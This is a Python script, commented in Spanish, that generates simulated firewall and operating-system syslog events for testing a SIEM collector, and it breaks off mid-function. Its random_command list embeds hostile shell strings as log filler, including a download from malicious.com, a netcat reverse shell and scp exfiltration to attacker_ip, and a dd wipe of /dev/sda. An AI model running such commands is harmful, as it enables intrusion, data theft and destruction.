import socket
import time
import random
from datetime import datetime

# Validar la dirección IP o el nombre del servidor
def validar_servidor(server):
    try:
        socket.gethostbyname(server)  # Intenta resolver el nombre o IP
        return True
    except socket.gaierror:
        return False

# Solicitar y validar la IP del colector de logs
while True:
    SYSLOG_SERVER = input("Introduce la IP del servidor Syslog (Wazuh, QRadar, etc.): ").strip()
    if validar_servidor(SYSLOG_SERVER):
        break
    print(f"[ERROR] La dirección del servidor '{SYSLOG_SERVER}' no es válida. Inténtalo de nuevo en 3 segundos...")
    time.sleep(3)

SYSLOG_PORT = 514  # Puerto por defecto (UDP)
PROTOCOL = 'UDP'  # 'UDP' o 'TCP'

# Plantillas de logs por marca (con placeholders)
LOG_TEMPLATES = {
    'Fortinet': [
        "<134>date={date} time={time} devname=FGT01 msg='Denied by policy {policy}' src={src} dst={dst} service={service}",
        "<134>date={date} time={time} devname=FGT01 msg='Allowed by policy {policy}' src={src} dst={dst} service={service}",
        "<134>date={date} time={time} devname=FGT01 msg='User {user} login success' src={src} dst={dst}",
        "<134>date={date} time={time} devname=FGT01 msg='User {user} login failure' src={src} dst={dst}",
        "<134>date={date} time={time} devname=FGT01 msg='System event: {event}'",
        "<134>date={date} time={time} devname=FGT01 logid=\"{logid}\" severity={severity} src={src}",
        "<134>date={date} time={time} devname=FGT01 kernel: Interface {iface} down",
        "<134>date={date} time={time} devname=FGT01 kernel: Interface {iface} up",
        "<134>date={date} time={time} devname=FGT01 msg='VPN tunnel {tunnel} established' src={src} dst={dst}",
        "<134>date={date} time={time} devname=FGT01 msg='VPN tunnel {tunnel} disconnected' src={src} dst={dst}",
        "<134>date={date} time={time} devname=FGT01 msg='Antivirus update: version {version}'",
        "<134>date={date} time={time} devname=FGT01 msg='Disk usage: {percent}% full on {disk}'",
        "<134>date={date} time={time} devname=FGT01 msg='CPU load average: {load}'",
        "<134>date={date} time={time} devname=FGT01 msg='Memory usage: {used}/{total} MB'",
        "<134>date={date} time={time} devname=FGT01 msg='Configuration change by {user}'",
        "<134>date={date} time={time} devname=FGT01 msg='Firmware upgrade started version={version}'",
        "<134>date={date} time={time} devname=FGT01 msg='Firmware upgrade completed version={version}'",
        "<134>date={date} time={time} devname=FGT01 msg='High temperature alert: {temp}°C'",
        "<134>date={date} time={time} devname=FGT01 msg='Session timeout for user {user}'",
        "<134>date={date} time={time} devname=FGT01 msg='Threat detected: {threat}' src={src} dst={dst}",
        "<134>date={date} time={time} devname=FGT01 msg='IPS signature {sigid} triggered'",
        "<134>date={date} time={time} devname=FGT01 msg='Web filter: URL blocked {url}'",
        "<134>date={date} time={time} devname=FGT01 msg='SSL inspection {action} for session {session}'",
        "<134>date={date} time={time} devname=FGT01 msg='User {user} changed password'",
        "<134>date={date} time={time} devname=FGT01 msg='Admin {user} logged out'",
        "<134>date={date} time={time} devname=FGT01 msg='Configuration backup created: {filename}'",
        "<134>date={date} time={time} devname=FGT01 msg='Configuration restore started'",
        "<134>date={date} time={time} devname=FGT01 msg='Configuration restore completed'",
        "<134>date={date} time={time} devname=FGT01 logid=\"{logid}\" msg='License expired'",
        "<134>date={date} time={time} devname=FGT01 logid=\"{logid}\" msg='License renewed'"
    ],
    'Cisco ASA': [
        "<189>{date} {time} %ASA-6-302013: Built outbound TCP connection for outside:{src}/{sport}",
        "<189>{date} {time} %ASA-4-313005: No matching connection for ICMP error message from {src}",
        "<189>{date} {time} %ASA-5-111008: User '{user}' executed 'show running-config'",
        "<189>{date} {time} %ASA-6-302015: Built inbound UDP connection for inside:{src}/{sport} to {dst}/{dport}",
        "<189>{date} {time} %ASA-6-302014: Teardown TCP connection for outside:{src}/{sport}",
        "<189>{date} {time} %ASA-6-302016: Teardown UDP connection for inside:{src}/{sport}",
        "<189>{date} {time} %ASA-5-713172: HTTP request from {src} to {dst}",
        "<189>{date} {time} %ASA-4-313001: Denied ICMP type={type} from {src}",
        "<189>{date} {time} %ASA-6-302020: Built outbound IPSEC SA for {tunnel}",
        "<189>{date} {time} %ASA-6-302021: Teardown IPSEC SA for {tunnel}",
        "<189>{date} {time} %ASA-4-305011: Incomplete header received",
        "<189>{date} {time} %ASA-6-725001: SNMP trap: {trap}",
        "<189>{date} {time} %ASA-5-713158: HTTP status {status} from {dst}",
        "<189>{date} {time} %ASA-5-713165: FTP login success for {user}",
        "<189>{date} {time} %ASA-4-713166: FTP login failure for {user}",
        "<189>{date} {time} %ASA-6-605007: AAA user authentication success for {user}",
        "<189>{date} {time} %ASA-4-605008: AAA user authentication failure for {user}",
        "<189>{date} {time} %ASA-6-113019: DHCP lease allocated to {src}",
        "<189>{date} {time} %ASA-4-113020: DHCP lease release from {src}",
        "<189>{date} {time} %ASA-6-305015: Fragment received from {src}",
        "<189>{date} {time} %ASA-7-713142: HTTP URL filter log: {url}",
        "<189>{date} {time} %ASA-6-106100: Access-list {acl} permitted {protocol} from {src}/{sport} to {dst}/{dport}",
        "<189>{date} {time} %ASA-4-106001: Access-list {acl} denied {protocol} from {src}/{sport} to {dst}/{dport}",
        "<189>{date} {time} %ASA-3-710002: PIX operating correctly",
        "<189>{date} {time} %ASA-6-713162: HTTP redirect to {url}",
        "<189>{date} {time} %ASA-5-622001: Syslog logging enabled",
        "<189>{date} {time} %ASA-5-622002: Syslog logging disabled",
        "<189>{date} {time} %ASA-6-113010: DHCP request from {src}",
        "<189>{date} {time} %ASA-6-408100: ASA platform event: {event}",
        "<189>{date} {time} %ASA-6-305004: ICMP type={type} code={code} from {src}"
    ],
    'Windows': [
        "<134>EventID=4624; Inicio de sesión exitoso de {user} desde {src_ip}",
        "<134>EventID=4625; Intento de inicio de sesión fallido para {user} desde {src_ip}",
        "<134>EventID=4634; Cierre de sesión de {user} desde {src_ip}",
        "<134>EventID=4647; Cierre de sesión iniciado por el usuario {user}",
        "<134>EventID=4648; Inicio de sesión con credenciales explícitas por {user}",
        "<134>EventID=4672; Privilegios especiales asignados a {user}",
        "<134>EventID=4688; Se ha creado un nuevo proceso: {process_name}",
        "<134>EventID=4689; El proceso {process_name} ha salido",
        "<134>EventID=4720; Se ha creado una cuenta de usuario: {user}",
        "<134>EventID=4722; Se ha habilitado la cuenta de usuario: {user}",
        "<134>EventID=4723; Intento de restablecer la contraseña de {user}",
        "<134>EventID=4724; Se ha restablecido la contraseña de {user}",
        "<134>EventID=4725; Se ha deshabilitado la cuenta de usuario: {user}",
        "<134>EventID=4726; Se ha eliminado la cuenta de usuario: {user}",
        "<134>EventID=4732; Se ha añadido un miembro a un grupo global: {group}",
        "<134>EventID=4733; Se ha eliminado un miembro de un grupo global: {group}",
        "<134>EventID=4740; Se ha bloqueado la cuenta de usuario: {user}",
        "<134>EventID=4767; Se ha desbloqueado la cuenta de usuario: {user}",
        "<134>EventID=4776; Intento de validación de credenciales para {user}",
        "<134>EventID=4798; Se ha enumerado la membresía de grupo local de {user}",
        "<134>EventID=4799; Se ha enumerado la membresía de grupo local habilitado para seguridad de {user}",
        "<134>EventID=5140; Acceso a recurso compartido de red: {share_name}",
        "<134>EventID=5142; Se ha añadido un recurso compartido de red: {share_name}",
        "<134>EventID=5143; Se ha modificado un recurso compartido de red: {share_name}",
        "<134>EventID=5144; Se ha eliminado un recurso compartido de red: {share_name}",
        "<134>EventID=5145; Se ha comprobado el acceso a recurso compartido de red: {share_name}",
        "<134>EventID=7034; El servicio {service_name} se ha detenido inesperadamente",
        "<134>EventID=7036; El servicio {service_name} ha cambiado de estado a {state}",
        "<134>EventID=7040; Se ha cambiado el tipo de inicio del servicio {service_name} a {start_type}",
        "<134>EventID=7045; Se ha instalado un nuevo servicio: {service_name}",
        "<134>EventID=1102; Se ha borrado el registro de seguridad",
        "<134>EventID=1104; El registro de seguridad está lleno",
        "<134>EventID=1105; Copia de seguridad automática del registro de eventos",
    ],
    'Palo Alto': [ "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|TRAFFIC|Allow traffic|1|src={src_ip} dst={dst_ip} spt={src_port} dpt={dst_port} proto={protocol} act=allow",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|TRAFFIC|Deny traffic|1|src={src_ip} dst={dst_ip} spt={src_port} dpt={dst_port} proto={protocol} act=deny",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|THREAT|Virus detected|5|src={src_ip} dst={dst_ip} spt={src_port} dpt={dst_port} proto={protocol} fileHash={file_hash} fileName={file_name} threatName={threat_name} act=alert",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|THREAT|Spyware detected|5|src={src_ip} dst={dst_ip} spt={src_port} dpt={dst_port} proto={protocol} threatName={threat_name} act=alert",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|THREAT|Vulnerability exploit|5|src={src_ip} dst={dst_ip} spt={src_port} dpt={dst_port} proto={protocol} threatName={threat_name} act=alert",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|THREAT|URL filtering|5|src={src_ip} dst={dst_ip} url={url} category={category} act=block",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|THREAT|Data filtering|5|src={src_ip} dst={dst_ip} fileName={file_name} fileType={file_type} act=alert",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|THREAT|File blocking|5|src={src_ip} dst={dst_ip} fileName={file_name} fileType={file_type} act=block",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|THREAT|WildFire verdict|5|src={src_ip} dst={dst_ip} fileName={file_name} verdict={verdict} act=alert",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|THREAT|DNS sinkhole|5|src={src_ip} dst={dst_ip} domain={domain} act=alert",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|SYSTEM|System reboot|3|msg=System reboot initiated by {user}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|SYSTEM|Configuration change|3|msg=Configuration changed by {user}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|SYSTEM|HA failover|3|msg=HA failover occurred",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|SYSTEM|License expired|3|msg=License for {feature} expired",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|SYSTEM|Software update|3|msg=Software updated to version {version}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|SYSTEM|Commit successful|3|msg=Configuration committed by {user}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|SYSTEM|Commit failed|3|msg=Configuration commit failed by {user}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|SYSTEM|Interface up|3|msg=Interface {interface} is up",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|SYSTEM|Interface down|3|msg=Interface {interface} is down",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|AUTH|User login successful|1|src={src_ip} user={user}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|AUTH|User login failed|1|src={src_ip} user={user}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|AUTH|Admin login successful|1|src={src_ip} admin={user}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|AUTH|Admin login failed|1|src={src_ip} admin={user}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|AUTH|User logout|1|src={src_ip} user={user}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|AUTH|Admin logout|1|src={src_ip} admin={user}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|CONFIG|Rule added|2|admin={user} rule={rule_name}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|CONFIG|Rule modified|2|admin={user} rule={rule_name}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|CONFIG|Rule deleted|2|admin={user} rule={rule_name}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|CONFIG|Address object added|2|admin={user} object={object_name}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|CONFIG|Address object modified|2|admin={user} object={object_name}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|CONFIG|Address object deleted|2|admin={user} object={object_name}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|CONFIG|Service object added|2|admin={user} object={object_name}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|CONFIG|Service object modified|2|admin={user} object={object_name}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|CONFIG|Service object deleted|2|admin={user} object={object_name}",
        "<134>CEF:0|Palo Alto Networks|PAN-OS|10.2|CONFIG|User-ID mapping added|2|admin={user} mapping={mapping_name}", ],

    'Linux': [  # Autenticación
        "<134>EventID=1000; Usuario inició sesión exitosamente: {user} desde {src_ip}",
        "<134>EventID=1001; Fallo en intento de inicio de sesión: {user} desde {src_ip}",
        "<134>EventID=1002; Usuario cerró sesión: {user}",
        "<134>EventID=1003; Usuario cambió su contraseña: {user}",
        "<134>EventID=1004; Usuario creado: {user} por {admin}",
        "<134>EventID=1005; Usuario eliminado: {user} por {admin}",
        "<134>EventID=1006; Usuario añadido al grupo: {user} al grupo {group}",
        "<134>EventID=1007; Usuario eliminado del grupo: {user} del grupo {group}",
        "<134>EventID=1008; Usuario bloqueado: {user}",
        "<134>EventID=1009; Usuario desbloqueado: {user}",

        # Procesos
        "<134>EventID=2000; Proceso iniciado: {process} por {user}",
        "<134>EventID=2001; Proceso terminado: {process} por {user}",
        "<134>EventID=2002; Proceso suspendido: {process} por {user}",
        "<134>EventID=2003; Proceso reanudado: {process} por {user}",
        "<134>EventID=2004; Proceso ejecutado con privilegios elevados: {process} por {user}",
        "<134>EventID=2005; Proceso matado: {process} por {user}",
        "<134>EventID=2006; Proceso zombie detectado: {process}",
        "<134>EventID=2007; Proceso en espera: {process}",
        "<134>EventID=2008; Proceso en ejecución: {process}",
        "<134>EventID=2009; Proceso detenido: {process}",

        # Red
        "<134>EventID=3000; Conexión entrante establecida desde {src_ip} a {dst_ip}:{dst_port}",
        "<134>EventID=3001; Conexión saliente establecida desde {src_ip} a {dst_ip}:{dst_port}",
        "<134>EventID=3002; Conexión cerrada entre {src_ip} y {dst_ip}:{dst_port}",
        "<134>EventID=3003; Intento de conexión fallido desde {src_ip} a {dst_ip}:{dst_port}",
        "<134>EventID=3004; Interfaz de red {interface} activada",
        "<134>EventID=3005; Interfaz de red {interface} desactivada",
        "<134>EventID=3006; Dirección IP asignada a {interface}: {ip_address}",
        "<134>EventID=3007; Dirección IP eliminada de {interface}: {ip_address}",
        "<134>EventID=3008; Cambio en la configuración de DNS: {dns_servers}",
        "<134>EventID=3009; Cambio en la configuración de la puerta de enlace: {gateway}",

        # Sistema
        "<134>EventID=4000; Sistema iniciado",
        "<134>EventID=4001; Sistema apagado",
        "<134>EventID=4002; Sistema reiniciado",
        "<134>EventID=4003; Cambio en la configuración del sistema por {user}",
        "<134>EventID=4004; Actualización del sistema instalada: {update}",
        "<134>EventID=4005; Error en la actualización del sistema: {update}",
        "<134>EventID=4006; Espacio en disco bajo en {filesystem}: {free_space} MB disponibles",
        "<134>EventID=4007; Uso de CPU alto detectado: {cpu_usage}%",
        "<134>EventID=4008; Uso de memoria alto detectado: {memory_usage}%",
        "<134>EventID=4009; Cambio en la zona horaria: {timezone}",

        # Auditoría
        "<134>EventID=5000; Archivo accedido: {file_path} por {user}",
        "<134>EventID=5001; Archivo modificado: {file_path} por {user}",
        "<134>EventID=5002; Archivo eliminado: {file_path} por {user}",
        "<134>EventID=5003; Archivo creado: {file_path} por {user}",
        "<134>EventID=5004; Permisos cambiados en {file_path} por {user}",
        "<134>EventID=5005; Propietario cambiado en {file_path} por {user}",
        "<134>EventID=5006; Intento de acceso no autorizado a {file_path} por {user}",
        "<134>EventID=5007; Montaje de dispositivo: {device} en {mount_point} por {user}",
        "<134>EventID=5008; Desmontaje de dispositivo: {device} de {mount_point} por {user}",
        "<134>EventID=5009; Cambio en la configuración de auditoría por {user}",

        # Servicios
        "<134>EventID=6000; Servicio iniciado: {service} por {user}",
        "<134>EventID=6001; Servicio detenido: {service} por {user}",
        "<134>EventID=6002; Servicio reiniciado: {service} por {user}",
        "<134>EventID=6003; Servicio falló: {service}",
        "<134>EventID=6004; Servicio habilitado: {service} por {user}",
        "<134>EventID=6005; Servicio deshabilitado: {service} por {user}",
        "<134>EventID=6006; Cambio en la configuración del servicio: {service} por {user}",
        "<134>EventID=6007; Servicio actualizado: {service} a la versión {version}",
        "<134>EventID=6008; Servicio degradado: {service}",
        "<134>EventID=6009; Servicio restaurado: {service}",

        # Seguridad
       "<134>EventID=7000; Intento de acceso remoto desde {src_ip} a {dst_ip}:{dst_port}",
        "<134>EventID=7001; Escaneo de puertos detectado desde {src_ip}",
        "<134>EventID=7002; Ataque de fuerza bruta detectado en {service} desde {src_ip}",
        "<134>EventID=7003; Malware detectado en {file_path}",
        "<134>EventID=7004; Fuga de datos potencial detectada: {details}",
        "<134>EventID=7005; Archivo sospechoso detectado: {file_path}",
        "<134>EventID=7006; Intento de escalada de privilegios detectado por {user}",
        "<134>EventID=7007; Acceso no autorizado a {file_path} por {user}",
        "<134>EventID=7008; Modificación de archivo crítico: {file_path} por {user}",
        "<134>EventID=7009; Eliminación de archivo sospechoso: {file_path} por {user}",
        "<134>EventID=7010; Configuración de firewall modificada por {user}",
        "<134>EventID=7011; Reglas de iptables cambiadas por {user}",
        "<134>EventID=7012; Servicio SSH reiniciado por {user}",
        "<134>EventID=7013; Servicio SSH detenido por {user}",
        "<134>EventID=7014; Servicio SSH iniciado por {user}",
        "<134>EventID=7015; Intento de conexión SSH fallido desde {src_ip}",
        "<134>EventID=7016; Acceso a directorio protegido: {dir_path} por {user}",
        "<134>EventID=7017; Intento de ejecución de script no autorizado: {script_path} por {user}",
        "<134>EventID=7018; Uso de sudo detectado por {user}",
        "<134>EventID=7019; Comando sospechoso ejecutado: {command} por {user}",
        "<134>EventID=7020; Acceso a puerto no autorizado: {port} por {user}",
        "<134>EventID=7021; Conexión VPN establecida por {user}",
        "<134>EventID=7022; Conexión VPN terminada por {user}",
        "<134>EventID=7023; Modificación de archivo de configuración: {file_path} por {user}",
        "<134>EventID=7024; Intento de desactivación de antivirus detectado por {user}",
        "<134>EventID=7025; Instalación de paquete sospechoso: {package_name} por {user}",
        "<134>EventID=7026; Eliminación de paquete sospechoso: {package_name} por {user}",
        "<134>EventID=7027; Actividad inusual en {service} detectada",
        "<134>EventID=7028; Conexión a red desconocida detectada por {user}",
        "<134>EventID=7029; Uso de herramienta de hacking detectado: {tool_name} por {user}",
        "<134>EventID=7030; Modificación de cron job: {job_name} por {user}",
        ]
}

# Funciones auxiliares para datos aleatorios
def random_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def random_port():
    return random.randint(1, 65535)  # Puerto aleatorio

def random_src_port():
    return random_port()  # Reutilizar la función `random_port`

def random_user():
    return random.choice([
        'admin', 'user', 'guest', 'root', 'sysadmin', 'john.doe'
        'jane.smith', 'alice.jones', 'bob.brown', 'charlie.white',
        'dave.black', 'eve.green', 'frank.red', 'grace.blue', 'hank.yellow',
        'irene.purple', 'jack.orange', 'karen.pink', 'larry.cyan',
        'mike.brown', 'nina.teal', 'olivia.gold', 'paul.silver', 'quinn.platinum',
        'rachel.bronze', 'sam.copper', 'tina.brass', 'ursula.tin',
        'victor.lead', 'wendy.zinc', 'xander.metal', 'yara.steel', 'zane.iron'
    ])

def random_service():
    return random.choice([
        'HTTP', 'HTTPS', 'SSH', 'DNS', 'ICMP', 'FTP', 'SMTP', 'POP3', 'IMAP',
        'Telnet', 'RDP', 'SNMP', 'LDAP', 'MySQL', 'PostgreSQL', 'Redis',
        'MongoDB', 'Memcached', 'NTP', 'DHCP', 'TFTP', 'SIP', 'RTSP', 'RTP',
        'SIP', 'SMB', 'NetBIOS', 'NFS', 'iSCSI', 'CIFS', 'AFP', 'Rsync',
        'SFTP', 'FTPS', 'HTTPS', 'WebDAV', 'SOAP', 'REST', 'GraphQL',
        'MQTT', 'AMQP', 'XMPP', 'Jabber', 'IRC', 'Bittorrent', 'Usenet',
        'WebSocket', 'HTTP/2', 'QUIC', 'SCTP', 'DCCP', 'UDP', 'TCP',
        'ICMPv6', 'GRE', 'IPSec', 'L2TP', 'PPTP', 'SSTP', 'OpenVPN',
        'WireGuard', 'IKEv2', 'IPSec NAT-T', 'SSL VPN', 'SSH Tunneling',    
        'HTTP Tunneling', 'DNS Tunneling', 'ICMP Tunneling', 'UDP Tunneling',
        'TCP Tunneling', 'SCTP Tunneling', 'DCCP Tunneling', 'GRE Tunneling',
        'L2TP Tunneling', 'PPTP Tunneling', 'SSTP Tunneling', 'OpenVPN Tunneling',
        'WireGuard Tunneling', 'IKEv2 Tunneling', 'IPSec NAT-T Tunneling',
        'SSL VPN Tunneling', 'SSH Tunneling', 'HTTP Tunneling', 'DNS Tunneling'
    ])

def random_service_name():
    return random.choice(['nginx', 'apache2', 'mysql', 'postgresql', 'redis', 'mongodb', 'ssh', 'ftp', 'httpd'])

def random_event():
    return random.choice(['reboot', 'config-change', 'interface-down', 'session-timeout'])

def random_process():
    return random.choice([
        'cmd.exe', 'powershell.exe', 'notepad.exe', 'svchost.exe', 
        'explorer.exe', 'java.exe', 'python.exe',
        'bash', 'sh', 'zsh', 'python3', 'perl', 'ruby',
        'java', 'node', 'npm', 'git', 'docker', 'nginx', 'apache2',
        'mysql', 'postgresql', 'redis-server', 'mongod', 'memcached',
        'ssh', 'sshd', 'vsftpd', 'proftpd', 'httpd', 'vsftpd',
        'sendmail', 'postfix', 'exim', 'dovecot', 'bind', 'named',
        'iptables', 'firewalld', 'ufw', 'fail2ban', 'auditd',
        'syslogd', 'rsyslogd', 'cron', 'atd', 'systemd', 'upstart',
        'init', 'launchd', 'supervisord', 'runit', 's6', 'monit',
        'supervisord', 'runit', 's6', 'monit', 'god', 'daemontools'
    ])

def random_command():
    return random.choice([
        'apt update', 'rm -rf /tmp/*', 'systemctl restart sshd', 'chmod 700 /etc',
        'chown root:root /etc/passwd', 'wget http://malicious.com/malware.sh',
        'curl -O http://malicious.com/malware.sh', 'echo "malicious code" > /tmp/malware.sh',
        'bash /tmp/malware.sh', 'python /tmp/malware.py', 'perl /tmp/malware.pl',
        'ruby /tmp/malware.rb', 'java -jar /tmp/malware.jar', 'nc -l -p 4444',
        'nc -e /bin/bash attacker_ip 4444', 'ssh user@attacker_ip',
        'scp file.txt user@attacker_ip:/tmp', 'rsync -avz /tmp user@attacker_ip:/tmp',
        'tar -czf backup.tar.gz /home/user', 'gzip -9 /tmp/malware.sh',
        'bzip2 -9 /tmp/malware.sh', 'xz -9 /tmp/malware.sh', 'zip -r backup.zip /home/user',
        'unzip backup.zip', 'tar -xzf backup.tar.gz', 'tar -xf backup.tar',
        'dd if=/dev/zero of=/dev/sda bs=1M count=100', 'mkfs.ext4 /dev/sda1',
        'mount /dev/sda1 /mnt', 'umount /mnt', 'fsck -y /dev/sda1',
        'chown -R user:user /home/user', 'chmod -R 755 /home/user', 'find / -name "*.sh"',
        'find / -type f -perm 777', 'find / -type d -perm 777', 'find / -type f -size +100M',
        'find / -type f -size -1M', 'find / -type f -name "*.log"', 'find / -type f -name "*.tmp"',
        'find / -type f -name "*.bak"', 'find / -type f -name "*.old"', 'find / -type f -name "*.swp"',
        'find / -type f -name "*.pid"', 'find / -type f -name "*.lock"', 'find / -type f -name "*.db"',
        'find / -type f -name "*.sql"', 'find / -type f -name "*.csv"', 'find / -type f -name "*.xml"',
        'find / -type f -name "*.json"', 'find / -type f -name "*.yaml"', 'find / -type f -name "*.yml"',
        'find / -type f -name "*.ini"', 'find / -type f -name "*.conf"', 'find / -type f -name "*.cfg"',
        'find / -type f -name "*.properties"', 'find / -type f -name "*.txt"'
    ])

def random_setting():
    return random.choice(['ssh-port', 'hostname', 'timezone',])

def random_value():
    return random.choice(['22', 'server1', 'UTC', 'PDT', 'EST'])

def random_load():
    return round(random.uniform(0.1, 5.0), 2)

def random_object_name():
    return random.choice(['Object1', 'Object2', 'Object3',])

def random_rule_name():
    return random.choice(['Rule1', 'Rule2', 'Rule3',])

def random_file_hash():
    return random.choice(['abc123', 'def456', 'ghi789', 'jkl012', 'mno345'])

def random_file_name():
    return random.choice(['file1.txt', 'file2.exe', 'file3.doc', 'file4.pdf', 'file5.jpg'])

def random_threat_name():
    return random.choice(['Trojan', 'Ransomware', 'Spyware', 'Adware',  'Worm', 'Rootkit'])

def random_domain():
    return random.choice(['example.com', 'malicious.net', 'phishing.org'])

def random_url():
    return random.choice([
        'http://example.com', 'https://malicious.net', 'http://phishing.org'])

def random_category():
    return random.choice(['Malware', 'Phishing', 'Spam'])

def random_mapping_name():
    return random.choice(['Mapping1', 'Mapping2', 'Mapping3'])

def random_file_path():
    return random.choice([
        '/var/log/syslog',
        '/etc/passwd',
        '/etc/shadow',
        '/etc/hosts',
        '/etc/ssh/sshd_config',
        '/etc/fstab',
        '/etc/cron.d',
        '/etc/cron.daily',  
        '/etc/cron.hourly',
        '/etc/cron.weekly',
        '/home/user/document.txt',
        '/home/user/.bash_history',
        '/home/user/.ssh/authorized_keys',
        '/home/user/.ssh/id_rsa',
        '/home/user/.ssh/id_rsa.pub',
        '/home/user/.ssh/config',
        '/home/user/.ssh/known_hosts',
        '/home/user/.ssh/id_dsa',
        '/tmp/tempfile',
        '/opt/app/config.yaml',
        '/usr/local/bin/script.sh',
        '/var/log/auth.log',
        '/var/log/messages',
        '/var/log/secure',
        '/var/log/cron.log',
        '/var/log/kern.log',
        '/var/log/boot.log',
        '/var/log/dpkg.log',
        '/var/log/apt/history.log',
        '/var/log/apt/term.log',
        '/var/log/syslog.1'
    ])

def random_device():
    return random.choice([
        '/dev/sda1', 
        '/dev/sdb1', 
        '/dev/nvme0n1', 
        '/dev/bda2',
        '/dev/bda2',
        '/dev/sr0',
        '/dev/loop0', 
        '/dev/loop1', 
        '/dev/nvme0n2'
    ])

def random_mount_point():
    return random.choice(['/mnt/data', '/mnt/backup', '/mnt/external'])

def random_filesystem():
    return random.choice(['ext4', 'ntfs', 'xfs', 'btrfs'])

def random_free_space():
    return random.randint(100, 10000)  # Espacio libre en MB

def random_cpu_usage():
    return random.randint(1, 100)  # Porcentaje de uso de CPU

def random_memory_usage():
    return random.randint(1, 100)  # Porcentaje de uso de memoria

def random_timezone():
    return random.choice(['UTC', 'PST', 'EST', 'CET', 'IST'])

def random_update():
    return random.choice([
        'Security Patch 1.2', 
        'Kernel Update 5.10', 
        'App Update 3.4', 
        'Library Update 2.1', 
        'Firmware Update 1.0', 
        'Driver Update 4.5', 
        'System Update 6.7'
    ])

def random_details():
    return random.choice([
        'Sensitive data accessed', 
        'Unauthorized file transfer', 
        'Data exfiltration attempt', 
        'Malicious script execution', 
        'Unauthorized access to database', 
        'Suspicious network activity', 
        'Unauthorized software installation', 
        'Data integrity violation', 
        'Unauthorized access to cloud storage', 
        'Malicious email attachment opened'
    ])

def random_dir_path():
    return random.choice(['/etc', '/var/log', '/home/user'])

def random_script_path():
    return random.choice([
        '/home/user/script.sh', 
        '/tmp/malicious.sh' 
       '/usr/local/bin/script.py',
        '/opt/scripts/cleanup.sh',
        '/usr/bin/backup.sh'
    ])

def random_tool_name():
    return random.choice([
        'nmap', 'metasploit', 'hydra', 'sqlmap', 'aircrack-ng',
        'wireshark', 'tcpdump', 'burpsuite', 'john', 'hashcat'
    ])

def random_job_name():
    return random.choice([
        'backup_job', 'cleanup_job', 'sync_job', 'monitor_job', 'update_job'
    ])

def random_feature():
    return random.choice([
        'Antivirus', 'Firewall', 'VPN', 'IPS', 'URL Filtering', 
        'Application Control', 'Threat Prevention'
        'Data Loss Prevention', 'Web Filtering', 'Email Security'
    ])

def random_interface():
    return random.choice(['eth0', 'wlan0', 'lo', 'eth1', 'ppp0', 'en0', 'en1', 'en2'])

def random_dns_servers():
    return random.choice([
        '8.8.8.8, 8.8.4.4', '1.1.1.1, 1.0.0.1'])

def random_gateway():
    return random.choice([
        '192.168.1.1', '10.0.0.1', '172.16.0.1', '10.10.10.1', '10.100.0.1', '200.0.0.1',
        '150.0.0.1','172.25.0.1'])

def random_ip_address():
    return random_ip()  # Reutilizar la función random_ip()

def random_start_type():
    return random.choice(['Automatic', 'Manual', 'Disabled'])

def random_state():
    return random.choice(['Running', 'Stopped', 'Paused'])

def random_version():
    return random.choice(['1.0.0', '2.3.4', '5.6.7', '8.9.10', '11.12.13'])

def random_file_type():
    return random.choice(['exe', 'doc', 'pdf', 'zip', 'jpg', 'png', 'mp4', 'mp3', 'txt', 'csv', 'json'])

def random_verdict():
    return random.choice(['Malicious', 'Benign', 'Suspicious', 'Unknown', 'Clean'])

def random_admin():
    return random.choice(['admin', 'root', 'superuser', 'sysadmin', 'administrator'])

def random_group():
    return random.choice(['Administrators', 'Users', 'Guests', 'Power Users', 'Remote Desktop Users'])

def random_acl():
    return random.choice(['AllowAll', 'DenyAll', 'CustomRule', 'DefaultRule', 'CustomACL'])

def random_protocol():
    return random.choice(['TCP', 'UDP', 'ICMP', 'HTTP', 'HTTPS', 'FTP', 'SSH', 'Telnet', 'DNS', 'SMTP', 'POP3', 'IMAP'])

def random_type():
    return random.randint(0, 255)

def random_code():
    return random.randint(0, 255)

def random_dst_ip():
    return random_ip()  # Reutilizar la función random_ip()

def random_sigid():
    return random.choice(['1001', '2002', '3003', '4004', '5005'])

def random_trap():
    return random.choice(['LinkDown', 'LinkUp', 'AuthenticationFailure', 'ColdStart', 'WarmStart'])

def random_status():
    return random.choice(['200 OK', '404 Not Found', '500 Internal Server Error', '403 Forbidden'])

def random_filename():
    return random.choice(['backup1.cfg', 'backup2.cfg', 'config1.cfg', 'config2.cfg', 'settings.cfg'])

def random_disk():
